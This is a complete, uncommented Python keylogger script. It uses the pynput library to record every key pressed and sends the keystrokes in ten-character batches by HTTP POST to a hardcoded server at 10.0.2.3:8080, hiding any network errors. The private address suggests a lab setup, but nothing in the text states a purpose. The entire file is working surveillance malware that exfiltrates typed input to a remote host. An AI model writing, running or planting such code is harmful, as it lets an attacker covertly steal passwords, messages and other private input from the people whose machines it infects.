from pynput import keyboard
import requests

SERVER_IP = "10.0.2.3:8080"

buffer = ""

def send_data(data):
    try:
        requests.post(f"http://{SERVER_IP}", data=data)
    except:
        pass

def on_press(key):
    global buffer

    try:
        buffer += key.char
    except AttributeError:
        buffer += f"[{key}]"

    if len(buffer) >= 10:
        send_data(buffer)
        buffer = ""

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
